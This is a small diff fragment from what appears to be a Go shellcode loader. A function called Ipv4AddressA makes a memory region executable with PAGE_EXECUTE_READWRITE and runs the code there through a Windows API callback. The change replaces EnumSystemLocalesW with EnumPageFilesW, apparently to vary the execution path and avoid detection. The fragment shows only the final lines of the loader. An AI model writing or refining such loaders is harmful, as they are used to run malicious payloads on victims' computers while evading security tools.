@@ -33,5 +33,5 @@ func Ipv4AddressA(shellcode []string) {
 		windows.PAGE_EXECUTE_READWRITE,
 		uintptr(unsafe.Pointer(&oldProtect)))
 
-	wdll.EnumSystemLocalesW().Call(addr, 0)
+	wdll.EnumPageFilesW().Call(addr, 0)
 }
